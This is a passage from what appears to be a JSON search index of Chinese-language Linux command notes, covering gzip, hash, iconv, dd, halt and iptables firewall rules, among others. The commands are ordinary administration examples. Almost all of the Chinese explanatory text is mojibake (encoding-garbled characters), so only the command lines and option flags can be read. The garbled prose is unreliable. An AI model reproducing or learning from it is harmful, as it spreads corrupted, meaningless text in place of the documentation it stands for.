ä¸­çš„å­—ç¬¦ä¸²è§£æä¸ºå®é™…çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œä»¥ä¾¿åœ¨è„šæœ¬ä¸­ä½¿ç”¨è¿™äº›å‚æ•°è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†æˆ–æ“ä½œã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getopt.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getopt.html"},{"title":"gnome-terminal","text":"ä¸»è¦é€‚ç”¨äºgnomeçš„å›¾å½¢åŒ–æ¡Œé¢ç³»ç»Ÿ, ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ æ‰“å¼€ä¸€ä¸ªç»ˆç«¯å¹¶æ‰§è¡Œls: gnome-terminal -- ls æ‰“å¼€ä¸€ä¸ªç»ˆç«¯å¹¶æ‰§è¡Œls, æ‰§è¡Œåä¸é€€å‡º: gnome-terminal -- bash -c 'ls ; bash'","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gnome-Terminal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gnome-Terminal.html"},{"title":"gzip","text":"å‹ç¼©/è§£å‹æ–‡ä»¶, å‹ç¼©åŒ…åç¼€åä¸€èˆ¬ä¸º.gz è¯­æ³•: gzip [é€‰é¡¹] è¢«å‹ç¼©æ–‡ä»¶ å¸¸ç”¨é€‰é¡¹ï¼š -d è§£å‹ -r å‹ç¼©æ‰€æœ‰å­ç›®å½• æ³¨è§£ tarçš„ -zé€‰é¡¹å°±æ˜¯è°ƒç”¨çš„gzipå‹ç¼©","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gzip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gzip.html"},{"title":"halt","text":"halt å‘½ä»¤é€šçŸ¥ç¡¬ä»¶æ¥åœæ­¢æ‰€æœ‰çš„ CPU åŠŸèƒ½ï¼Œä½†æ˜¯ä»ç„¶ä¿æŒé€šç”µã€‚ ä½ å¯ä»¥ç”¨å®ƒä½¿ç³»ç»Ÿå¤„äºä½å±‚ç»´æŠ¤çŠ¶æ€ã€‚æ³¨æ„åœ¨æœ‰äº›æƒ…å†µä¼šå®ƒä¼šå®Œå…¨å…³é—­ç³»ç»Ÿã€‚ åœæ­¢æœºå™¨: halt å…³é—­æœºå™¨ã€å…³é—­ç”µæº: halt -p é‡å¯æœºå™¨: halt --reboot","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-halt.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-halt.html"},{"title":"hash","text":"æ¯ä¸ªSHELLéƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„hashè¡¨, åˆå§‹æ—¶å€™ä¸ºç©º, å¯ç›´æ¥hashæŸ¥çœ‹å½“å‰SHELLçš„hashè¡¨: hash æ¯å½“ä½ æ‰§è¡Œè¿‡ä¸€æ¡å‘½ä»¤æ—¶ï¼Œhashè¡¨ä¼šè®°å½•ä¸‹è¿™æ¡å‘½ä»¤çš„è·¯å¾„ï¼Œå°±ç›¸å½“äºç¼“å­˜ä¸€æ ·ã€‚ ç¬¬ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤shellè§£é‡Šå™¨é»˜è®¤çš„ä¼šä»PATHè·¯å¾„ä¸‹å¯»æ‰¾è¯¥å‘½ä»¤çš„è·¯å¾„ï¼Œ å½“ä½ ç¬¬äºŒæ¬¡ä½¿ç”¨è¯¥å‘½ä»¤æ—¶ï¼Œshellè§£é‡Šå™¨é¦–å…ˆä¼šæŸ¥çœ‹hashè¡¨ï¼Œæ²¡æœ‰è¯¥å‘½ä»¤æ‰ä¼šå»PATHè·¯å¾„ä¸‹å¯»æ‰¾ hashè¡¨çš„ä½œç”¨ï¼šå¤§å¤§æé«˜å‘½ä»¤çš„è°ƒç”¨é€Ÿç‡ ä¸å¸¦å‚æ•°, æŸ¥çœ‹å½“å‰å·²æœ‰çš„è¡¨, hashè¡¨ä¼šè®°å½•ä¸‹æ‰§è¡Œå‘½ä»¤çš„æ¬¡æ•°ï¼Œä»¥åŠè¯¥å‘½ä»¤çš„ç»å¯¹è·¯å¾„ é€‰é¡¹: -l æ—¢å¯ä»¥çœ‹åˆ°hashè¡¨å‘½ä»¤çš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å®ƒçš„åå­—åŠåˆ«å -p <cmd new_name> ç»™å·²æœ‰çš„æŒ‡ä»¤ cmd é‡å‘½åä¸º new_name (èµ·åˆ«å), å¦‚: hash -p /bin/ls bb ä¹‹åç›´æ¥ bb è°ƒç”¨çš„å°±æ˜¯lsäº† -t <cmd> æŸ¥çœ‹ cmd åœ¨hashè¡¨ä¸­å­˜å‚¨çš„è·¯å¾„, æ²¡æœ‰å°±ç›´æ¥æŠ¥é”™æ²¡æ‰¾åˆ° -r æ¸…ç©ºhashè¡¨ -d <cmd> ä»…æ¸…é™¤æŸä¸€ä¸ªhashè®°å½•","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-have.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-have.html"},{"title":"iconv","text":"iconv è½¬æ¢æŒ‡å®šæ–‡ä»¶çš„ç¼–ç ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œäº¦å¯æŒ‡å®šè¾“å‡ºæ–‡ä»¶ ä½¿ç”¨: iconv [options] [file] é€‰é¡¹å‚æ•° -f , --from-code= encode-name åŸå§‹æ–‡æœ¬ç¼–ç  -t , --to-code= encode-name è¾“å‡ºç¼–ç  -l , --list åˆ—ä¸¾æ‰€æœ‰å·²çŸ¥çš„å­—ç¬¦é›† -c ä»è¾“å‡ºä¸­å¿½ç•¥æ— æ•ˆçš„å­—ç¬¦ -o , --output= FILE è¾“å‡ºæ–‡ä»¶ -s , --silent å…³é—­è­¦å‘Š --verbose æ‰“å°è¿›åº¦ä¿¡æ¯ ç”¨ä¾‹ å°†æ–‡ä»¶ä»¥ gbk ç¼–ç è¯»å‡º, å¹¶è½¬åŒ–ä¸º utf8 ç¼–ç , é‡å®šå‘åˆ° b.txt: # æœ‰æ¬¡macä¸‹è½½äº†ä¸€æœ¬å°è¯´, æ‰“å¼€ä¹±ç , pageçš„è‡ªåŠ¨è¯†åˆ«ç¼–ç æ²¡æ³•ç”¨ # åˆæ²¡æœ‰notpad++è¿™ç§å·¥å…·, vscodeå€’æ˜¯å¯ä»¥åˆ‡æ¢ç¼–ç , ä½†æ˜¯ä¿å­˜çš„æ—¶å€™å­˜åœ¨é—®é¢˜. # åªå¥½ç”¨å‘½ä»¤è½¬æ¢äº† iconv -f gbk -t utf8 -c mushenji2.txt >b.txt","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iconv-(mac).html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iconv-(mac).html"},{"title":"ifstat","text":"æŸ¥çœ‹å®æ—¶ç½‘é€Ÿ å®‰è£…(Debian/Ubuntu): apt install ifstat","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifStat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifStat.html"},{"title":"dd","text":"å¤åˆ¶æ–‡ä»¶å¹¶å¯¹åŸæ–‡ä»¶çš„å†…å®¹è¿›è¡Œè½¬æ¢å’Œæ ¼å¼åŒ–å¤„ç†: bs=<å­—èŠ‚æ•°>ï¼šå°†ibsï¼ˆè¾“å…¥ï¼‰ä¸obsï¼ˆè¾“å‡ºï¼‰è®¾æˆæŒ‡å®šçš„å­—èŠ‚æ•°ï¼› cbs=<å­—èŠ‚æ•°>ï¼šè½¬æ¢æ—¶ï¼Œæ¯æ¬¡åªè½¬æ¢æŒ‡å®šçš„å­—èŠ‚æ•°ï¼› conv=<å…³é”®å­—>ï¼šæŒ‡å®šæ–‡ä»¶è½¬æ¢çš„æ–¹å¼ï¼› count=<åŒºå—æ•°>ï¼šä»…è¯»å–æŒ‡å®šçš„åŒºå—æ•°ï¼› ibs=<å­—èŠ‚æ•°>ï¼šæ¯æ¬¡è¯»å–çš„å­—èŠ‚æ•°ï¼› obs=<å­—èŠ‚æ•°>ï¼šæ¯æ¬¡è¾“å‡ºçš„å­—èŠ‚æ•°ï¼› if=<æ–‡ä»¶>ï¼›ä»£è¡¨è¾“å…¥æ–‡ä»¶ of=<æ–‡ä»¶>ï¼šè¾“å‡ºåˆ°æ–‡ä»¶ï¼› seek=<åŒºå—æ•°>ï¼šä¸€å¼€å§‹è¾“å‡ºæ—¶ï¼Œè·³è¿‡æŒ‡å®šçš„åŒºå—æ•°ï¼› skip=<åŒºå—æ•°>ï¼šä¸€å¼€å§‹è¯»å–æ—¶ï¼Œè·³è¿‡æŒ‡å®šçš„åŒºå—æ•°ï¼› --helpï¼šå¸®åŠ©ï¼› --versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ ä¾‹å¦‚ç”Ÿæˆ10gçš„å¤§æ–‡ä»¶: dd if=/dev/zero of=test bs=1M count=0 seek=10000 #ä¸å ç©ºé—´ dd if=/dev/zero of=test bs=10G count=1 è¯»å–ä½äºåœ°å€ 0x1000 çš„ 4 å­—èŠ‚æ•°æ®: # /dev/mem ä»£è¡¨ç‰©ç†å†…å­˜ dd if=/dev/mem bs=4 count=1 skip=$((0x1000)) status=none | od -t x4 -An æ‹“å±•-Winä¸‹è¯»å–æŒ‡å®šå†…å­˜åœ°å€æ•°æ® ä½¿ç”¨ WinDbg è°ƒè¯•å™¨ WinDbg æ˜¯ Windows å¹³å°ä¸Šä½¿ç”¨çš„å¼ºå¤§è°ƒè¯•å™¨å·¥å…·ã€‚ ä½¿ç”¨ WinDbgï¼Œæ‚¨å¯ä»¥æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜ç©ºé—´å¹¶è¯»å–æŒ‡å®šåœ°å€çš„æ•°æ®ã€‚ ç¤ºä¾‹å‘½ä»¤ï¼Œåœ¨ WinDbg ä¸­è¯»å–åœ°å€ 0x1000 çš„ 4 å­—èŠ‚æ•°æ®: > .open <è¿›ç¨‹åæˆ–è¿›ç¨‹ID> > db 0x1000 L4","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-in-the-end.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-in-the-end.html"},{"title":"iptables","text":"iptableså…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œ ç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šåˆ°å¯¹åº”çš„å®‰å…¨æ¡†æ¶ï¼Œ è€Œè¿™ä¸ªå®‰å…¨æ¡†æ¶æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶æ˜¯ netfilter netfilter æ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼Œä½äºå†…æ ¸ç©ºé—´. netfilter æ˜¯linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œå…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆnetwork address translateï¼‰ æ•°æ®åŒ…å†…å®¹ä¿®æ”¹ ä»¥åŠæ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½ netfilter/iptables ç»„æˆlinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ã€‚ å…è´¹ï¼Œå¯ä»¥æ›¿ä»£æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆå°åŒ…è¿‡æ»¤ã€å°åŒ…é‡å®šå‘ã€ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ç­‰åŠŸèƒ½ã€‚ è™½ç„¶ä½¿ç”¨ service iptables restart æ¥å¯åŠ¨æœåŠ¡ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼Œ iptableså¹¶æ²¡æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œæ‰€ä»¥å¹¶ä¸ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æœåŠ¡ï¼Œè€Œåº”è¯¥æ˜¯å†…æ ¸æä¾›çš„æœåŠ¡ã€‚ è¯­æ³•-é€‰é¡¹ è¯­æ³•: iptables -t è¡¨å <-A/I/D/R> è§„åˆ™é“¾å [è§„åˆ™å·] <-i/o ç½‘å¡å> -p åè®®å <-s æºIP/æºå­ç½‘> --sport æºç«¯å£ <-d ç›®æ ‡IP/ç›®æ ‡å­ç½‘> --dport ç›®æ ‡ç«¯å£ -j åŠ¨ä½œ #-A æŒ‡å®šé“¾çš„æœ«å°¾æ–°å¢ä¸€ä¸ªæŒ‡å®šçš„è§„åˆ™ #-I é“¾çš„æŒ‡å®šä½ç½®æ’å…¥ä¸€æ¡æˆ–å¤šæ¡è§„åˆ™ #-D æŒ‡å®šé“¾çš„chainä¸­åˆ é™¤ä¸€æ¡æˆ–è€…å¤šæ¡è§„åˆ™ #-R num æ›¿æ¢/ä¿®æ”¹ç¬¬å‡ æ¡è§„åˆ™ #-P è®¾ç½®é»˜è®¤è§„åˆ™ é€‰é¡¹ -P è®¾ç½®é»˜è®¤ç­–ç•¥:iptables -P INPUT (DROP -F æ¸…ç©ºè§„åˆ™é“¾ -L æŸ¥çœ‹è§„åˆ™é“¾ -A åœ¨è§„åˆ™é“¾çš„æœ«å°¾åŠ å…¥æ–°è§„åˆ™ -I num åœ¨è§„åˆ™é“¾çš„å¤´éƒ¨åŠ å…¥æ–°è§„åˆ™ -D num åˆ é™¤æŸä¸€æ¡è§„åˆ™ -s åŒ¹é…æ¥æºåœ°å€IP/MASKï¼ŒåŠ å¹å·\"!\"è¡¨ç¤ºé™¤è¿™ä¸ªIPå¤–ã€‚ -d åŒ¹é…ç›®æ ‡åœ°å€ -i ç½‘å¡åç§° åŒ¹é…ä»è¿™å—ç½‘å¡æµå…¥çš„æ•°æ® -o ç½‘å¡åç§° åŒ¹é…ä»è¿™å—ç½‘å¡æµå‡ºçš„æ•°æ® -p åŒ¹é…åè®®,å¦‚tcp,udp,icmp --dport num åŒ¹é…ç›®æ ‡ç«¯å£å· --sport num åŒ¹é…æ¥æºç«¯å£å· -n è¡¨ç¤ºä¸å¯¹ IP åœ°å€è¿›è¡ŒåæŸ¥ï¼ŒåŠ ä¸Šè¿™ä¸ªå‚æ•°æ˜¾ç¤ºé€Ÿåº¦å°†ä¼šåŠ å¿«ã€‚ -v è¡¨ç¤ºè¾“å‡ºè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…å«é€šè¿‡è¯¥è§„åˆ™çš„æ•°æ®åŒ…æ•°é‡ã€æ€»å­—èŠ‚æ•°ä»¥åŠç›¸åº”çš„ç½‘ç»œæ¥å£ã€‚ -m è¡¨ç¤ºä½¿ç”¨æ¨¡å— å‚è€ƒ: https://www.zsythink.net/archives/1199 å¦‚: iptables -t nat -A PERROUTING -p tcp -s 10.10.10.10 --sport 67 -d 10.10.10.11 --dport 67 -j ACCEPT # è¿™é‡Œå¦‚æœæ˜¯å¤šç«¯å£å¯èƒ½ä¼šå‡ºç°ä¸èƒ½è¯†åˆ«sportçš„æƒ…å†µ éœ€æ­é…multiport # multiportå¤šç«¯å£ï¼Œ\"ï¼Œ\"è¡¨ç¤ºæˆ–ï¼Œ\"ï¼š\"è¡¨ç¤ºåŒºé—´ iptables -t nat -A PERROUTING -p tcp -s 10.10.10.10 -m multiport --sport 67ï¼Œ68 -d 10.10.10.11 --dport 67 -j ACCEPT -j çš„å‡ ç§åŠ¨ä½œ ACCEPT #æ¥æ”¶æ•°æ®åŒ… DROP #ä¸¢å¼ƒæ•°æ®åŒ… REDIRECT #é‡å®šå‘ï¼Œæ˜ å°„,é€æ˜ä»£ç† SNAT #æºåœ°å€è½¬æ¢ DNAT #ç›®æ ‡åœ°å€è½¬æ¢ MASQUERADE #IPä¼ªè£…ï¼ˆNATï¼‰ï¼Œç”¨äºADSL LOG #æ—¥å¿—è®°å½• iptablesé»˜è®¤é“¾ INPUT å¤„ç†è¾“å…¥æ•°æ®åŒ… OUTPUT å¤„ç†è¾“å‡ºæ•°æ®åŒ… FORWARD å¤„ç†è½¬å‘æ•°æ®åŒ… PERROUTING ç”¨äºç›®æ ‡åœ°å€è½¬æ¢ï¼ˆDNATï¼‰ POSTROUTING ç”¨äºæºåœ°å€è½¬æ¢ï¼ˆSNATï¼‰ è¿‡æ»¤æ¡†æ¶ å¦‚æœæ˜¯å¤–éƒ¨ä¸»æœºå‘é€æ•°æ®åŒ…ç»™é˜²ç«å¢™æœ¬æœºï¼Œæ•°æ®å°†ä¼šç»è¿‡ PREROUTING é“¾ä¸ INPUT é“¾ï¼› å¦‚æœæ˜¯é˜²ç«å¢™æœ¬æœºå‘é€æ•°æ®åŒ…åˆ°å¤–éƒ¨ä¸»æœºï¼Œæ•°æ®å°†ä¼šç»è¿‡ OUTPUT é“¾ä¸ POSTROUTING é“¾ï¼› å¦‚æœé˜²ç«å¢™ä½œä¸ºè·¯ç”±è´Ÿè´£è½¬å‘æ•°æ®ï¼Œåˆ™æ•°æ®å°†ç»è¿‡ PREROUTING é“¾ã€FORWARD é“¾ä»¥åŠ POSTROUTING é“¾ã€‚ å››ç§è¡¨ filter è¿‡æ»¤åŠŸèƒ½ï¼Œåªèƒ½ä½œç”¨åœ¨ä¸‰ä¸ªé“¾ä¸Šé¢ï¼šINPUT,FORWARD,OUTPUT nat åœ°å€è½¬æ¢ï¼Œåªèƒ½ä½œç”¨åœ¨ï¼šPREROUTING,OUTPUT,POSTROUTING(centos 7ä¸­è¿˜æœ‰INPUT) mangle ä¿®æ”¹æŠ¥æ–‡åŸæ•°æ®ï¼Œäº”ä¸ªé“¾éƒ½å¯ä»¥ raw å…³é—­natå¯ç”¨çš„è¿½è¸ªæœºåˆ¶ï¼ŒPREROUTING,OUTPUT æ¢ç§æ–¹å¼: # é“¾ è¡¨ prerouting raw --> mangle --> nat input mangle --> filter (centos7 has nat, 6 not) forward mangle --> filter output raw --> mangle --> nat --> filter postrouting mangle --> nat å¸¸ç”¨çš„ä¸€äº›å‘½ä»¤ å¸¸ç”¨çš„ä¸€äº›å‘½ä»¤: iptables -F # æ¸…ç©ºæ‰€æœ‰çš„é˜²ç«å¢™è§„åˆ™ iptables -nvL # æŸ¥çœ‹ä¸‰ä¸ªé“¾ iptables -X INPUT # åˆ é™¤æŒ‡å®šçš„é“¾ï¼Œè¿™ä¸ªé“¾å¿…é¡»æ²¡æœ‰è¢«å…¶å®ƒä»»ä½•è§„åˆ™å¼•ç”¨ï¼Œè€Œä¸”è¿™æ¡ä¸Šå¿…é¡»æ²¡æœ‰ä»»ä½•è§„åˆ™ã€‚ # å¦‚æœæ²¡æœ‰æŒ‡å®šé“¾åï¼Œåˆ™ä¼šåˆ é™¤è¯¥è¡¨ä¸­æ‰€æœ‰éå†…ç½®çš„é“¾ã€‚ iptables -Z INPUT # æŠŠæŒ‡å®šé“¾ï¼Œæˆ–è€…è¡¨ä¸­çš„æ‰€æœ‰é“¾ä¸Šçš„æ‰€æœ‰è®¡æ•°å™¨æ¸…é›¶ã€‚ iptables -L [-t è¡¨å] [é“¾å] # åˆ—å‡ºå·²è®¾ç½®çš„è§„åˆ™ -mçš„ä¸€äº›æ¨¡å— multiport å¤šç«¯å£åŒ¹é… å¯ç”¨äºåŒ¹é…éè¿ç»­æˆ–è¿ç»­ç«¯å£ï¼›æœ€å¤šæŒ‡å®š15ä¸ªç«¯å£ï¼› å®ä¾‹: iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPT iptables -A OUTPUT -p tcp -m multiport --sport 22,80 -j ACCEPT iprange åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„åœ°å€ åŒ¹é…ä¸€æ®µè¿ç»­çš„åœ°å€è€Œéæ•´ä¸ªç½‘ç»œæ—¶æœ‰ç”¨ å®ä¾‹: iptables -A INPUT -p tcp -m iprange --src-range 192.168.118.0-192.168.118.60 --dport 22 -j ACCEPT iptables -A OUTPUT -p tcp -m iprange --dst-range 192.168.118.0-192.168.118.60 --sport 22 -j ACCEPT string å­—ç¬¦ä¸²åŒ¹é…ï¼Œèƒ½å¤Ÿæ£€æµ‹æŠ¥æ–‡åº”ç”¨å±‚ä¸­çš„å­—ç¬¦ä¸² å­—ç¬¦åŒ¹é…æ£€æŸ¥é«˜æ•ˆç®—æ³•ï¼škmp, bm, èƒ½å¤Ÿå±è”½éæ³•å­—ç¬¦ å®ä¾‹: #æ³¨æ„è¯¥æ¡è§„åˆ™éœ€è¦æ·»åŠ åˆ°OUTPUTé“¾ï¼Œå½“æœåŠ¡ç«¯è¿”å›æ•°æ®æŠ¥æ–‡æ£€æŸ¥åˆ°æœ‰å…³é”®å­—\"sex\"æ—¶ï¼Œåˆ™ä¸¢å¼ƒè¯¥æŠ¥æ–‡ï¼Œå¯ç”¨äºwebæ•æ„Ÿè¯è¿‡æ»¤ iptables -A OUTPUT -p tcp --dport 80 -m string --algo kmp --string \"sex\" -j DROP connlimit è¿æ¥æ•°é™åˆ¶ï¼Œå¯¹æ¯IPæ‰€èƒ½å¤Ÿå‘èµ·å¹¶å‘è¿æ¥æ•°åšé™åˆ¶ï¼› é»˜è®¤INPUT ä¸º DROP. æ¯ä¸ªipå¯¹sshæœåŠ¡çš„è®¿é—®æœ€å¤§ä¸º3ä¸ªå¹¶å‘è¿æ¥ï¼Œè¶…è¿‡åˆ™ä¸¢å¼ƒ: iptables -A INPUT -p tcp --dport 22 -m connlimit ! --connlimit-above 3 -j ACCEPT limit é€Ÿç‡é™åˆ¶ limit-burst è®¾ç½®é»˜è®¤é˜€å€¼ é»˜è®¤æ”¾è¡Œ10ä¸ªï¼Œå½“åˆ°è¾¾limit-bursté˜€å€¼åï¼Œå¹³å‡6ç§’æ”¾è¡Œ1ä¸ª: iptables -A INPUT -p icmp -m limit --limit 10/minute --limit-burst 10 -j ACCEPT state çŠ¶æ€æ£€æŸ¥ è¿æ¥è¿½è¸ªä¸­çš„çŠ¶æ€ï¼š NEW: æ–°å»ºç«‹ä¸€ä¸ªä¼šè¯ ESTABLISHEDï¼šå·²å»ºç«‹çš„è¿æ¥ RELATED: æœ‰å…³è”å…³ç³»çš„è¿æ¥ INVALID: æ— æ³•è¯†åˆ«çš„è¿æ¥ æ”¾è¡Œsshçš„é¦–æ¬¡è¿æ¥çŠ¶æ€: iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT è¯¦ç»†ç‚¹ INVALIDï¼šæ— æ•ˆçš„å°åŒ…ï¼Œä¾‹å¦‚æ•°æ®ç ´æŸçš„å°åŒ…çŠ¶æ€ ESTABLISHEDï¼šå·²ç»è”æœºæˆåŠŸçš„è”æœºçŠ¶æ€ï¼› NEWï¼šæƒ³è¦æ–°å»ºç«‹è”æœºçš„å°åŒ…çŠ¶æ€ï¼› RELATEDï¼šè¿™ä¸ªæœ€å¸¸ç”¨ï¼è¡¨ç¤ºè¿™ä¸ªå°åŒ…æ˜¯ä¸æˆ‘ä»¬ä¸»æœºå‘é€å‡ºå»çš„å°åŒ…æœ‰å…³ï¼Œ å¯èƒ½æ˜¯å“åº”å°åŒ…æˆ–è€…æ˜¯è”æœºæˆåŠŸä¹‹åçš„ä¼ é€å°åŒ…ï¼è¿™ä¸ªçŠ¶æ€å¾ˆå¸¸è¢«è®¾å®šï¼Œå› ä¸ºè®¾å®šäº†ä»–ä¹‹åï¼Œåªè¦æœªæ¥ç”±æœ¬æœºå‘é€å‡ºå»çš„å°åŒ…ï¼Œå³ä½¿æˆ‘ä»¬æ²¡æœ‰è®¾å®šå°åŒ…çš„ INPUT è§„åˆ™ï¼Œè¯¥æœ‰å…³çš„å°åŒ…è¿˜æ˜¯å¯ä»¥è¿›å…¥æˆ‘ä»¬ä¸»æœºï¼Œ å¯ä»¥ç®€åŒ–ç›¸å½“å¤šçš„è®¾å®šè§„åˆ™ã€‚ ç›¸å…³æŒ‡ä»¤ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/iptables-save /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/iptables-restore é—®é¢˜--sportä¸èƒ½è¯†åˆ« --sportä¸€ç›´ä¸èƒ½è¯†åˆ«ï¼Œç™¾åº¦ä¹Ÿæ²¡æŸ¥åˆ°åŸå›  è¯¢é—®æ‰çŸ¥é“ã€‚éœ€è¦é…åˆæŒ‡å®šåè®®ä¸multiportæ¥åŒ¹é…å¤šç«¯å£æ‰å¯ä»¥ ç«¯å£å¦‚æœä½¿ç”¨ å†’å· è¡¨ç¤ºè¿ç»­ç«¯å£","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables.html"},{"title":"iptables-restore","text":"æ‰¹é‡å¯¼å…¥Linuxé˜²ç«å¢™è§„åˆ™ ä¾‹å¦‚å°†/tmp/iptables.txtè§„åˆ™å†™å…¥iptables: iptables-restore < /tmp/iptables.txt æ³¨è§£ å¤‡ä»½æ¢å¤æ—¶ï¼Œ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/iptables-save ã€ iptables-restore ä¸¤ä¸ªéƒ½éœ€è¦æ­é…é‡å®šå‘ç¬¦ä½¿ç”¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-restore.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-restore.html"},{"title":"iptables-save","text":"æ‰¹é‡å¯¼å‡ºLinuxé˜²ç«å¢™è§„åˆ™ï¼Œ ç›´æ¥æ‰§è¡Œï¼šæ˜¾ç¤ºå½“å‰å¯ç”¨çš„æ‰€æœ‰è§„åˆ™ï¼ŒæŒ‰rawã€mangleã€natã€filteré¡ºåºåˆ—å‡º -c æŒ‡å®šåœ¨è¿˜åŸiptablesè¡¨æ—¶å€™ï¼Œè¿˜åŸå½“å‰çš„æ•°æ®åŒ…è®¡æ•°å™¨å’Œå­—èŠ‚è®¡æ•°å™¨çš„å€¼ï¼› -t æŒ‡å®šè¡¨ \"#\"å·å¼€å¤´çš„è¡¨ç¤ºæ³¨é‡Šï¼› \"*è¡¨å\"è¡¨ç¤ºæ‰€åœ¨çš„è¡¨ï¼› \"ï¼šé“¾åé»˜è®¤ç­–ç•¥\"è¡¨ç¤ºç›¸åº”çš„é“¾åŠé»˜è®¤ç­–ç•¥ï¼Œå…·ä½“çš„è§„åˆ™éƒ¨åˆ†çœç•¥äº†å‘½ä»¤å\"iptables\"ï¼› \"COMMIT\"è¡¨ç¤ºæäº¤å‰é¢çš„è§„åˆ™è®¾ç½®ï¼› æ³¨è§£ å¤‡ä»½æ¢å¤æ—¶ï¼Œ iptables-saveã€ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/iptables ä¸¤ä¸ªéƒ½éœ€è¦æ­é…é‡å®šå‘ç¬¦ä½¿ç”¨ ä»¥å‰è®°çš„, ç°åœ¨ä¸è®°å¾—å•¥æ„æ€: # è¿™æ˜¯æ³¨é‡Š *nat # è¿™è¡¨ç¤ºä¸‹é¢è¿™äº›æ˜¯natè¡¨ä¸­çš„é…ç½® :PREROUTING ACCEPT [5129516:445315174] # :PREROUTING ACCEPTï¼Œè¡¨ç¤ºnatè¡¨ä¸­çš„PREROUTING é“¾é»˜è®¤æŠ¥æ–‡ç­–ç•¥æ˜¯æ¥å—ï¼ˆåŒ¹é…ä¸åˆ°è§„åˆ™ç»§ç»­ï¼‰ ï¼Œ # [5129516:445315174] å³[packet, bytes]ï¼Œè¡¨ç¤ºå½“å‰æœ‰5129516ä¸ªåŒ…(445315174å­—èŠ‚)ç»è¿‡natè¡¨çš„PREROUTING é“¾ :INPUT ACCEPT [942957:151143842] :OUTPUT ACCEPT [23898:3536261] :POSTROUTING ACCEPT [23898:3536261] -- è§£é‡ŠåŒä¸Š :DOCKER - [0:0] -- è§£é‡ŠåŒä¸Šï¼ˆæ­¤æ¡æ˜¯è‡ªå®šä¹‰é“¾ï¼‰ ---------- ä¸‹é¢å¼€å§‹æŒ‰æ¡è¾“å‡ºæ‰€æœ‰è§„åˆ™---------- [4075:366986] -A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER -- [4075:366986]å³[packet, bytes]ï¼Œè¡¨ç¤ºç»è¿‡æ­¤è§„åˆ™çš„åŒ…æ•°ï¼Œå­—èŠ‚æ•°ã€‚ 